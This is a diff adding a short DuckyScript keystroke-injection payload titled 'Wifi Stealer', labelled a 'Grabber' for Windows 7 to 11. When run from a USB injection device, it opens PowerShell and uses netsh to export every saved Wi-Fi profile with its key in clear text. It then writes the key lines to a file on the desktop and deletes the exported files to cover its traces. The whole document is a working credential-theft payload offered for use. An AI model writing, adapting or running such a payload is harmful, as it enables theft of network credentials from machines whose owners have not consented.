@@ -1,0 +1,13 @@
+REM Title: Wifi Stealer
+REM Author: 7h30th3r0n3
+REM Target:  Tested on Windows 7/8/10/11 
+REM Version: 1.0
+REM Category: Grabber
+REM Extract SSID and wifi shared key and place it in a txt file nammed 0.txt on the desktop 
+GUI r
+DELAY 300
+STRING powershell
+ENTER 
+DELAY 300
+STRING cd Desktop;netsh wlan export profile key=clear;Select-String -Path Wi-Fi-* -Pattern 'keyMaterial'>0.txt;del Wi-Fi-*;exit
+ENTER
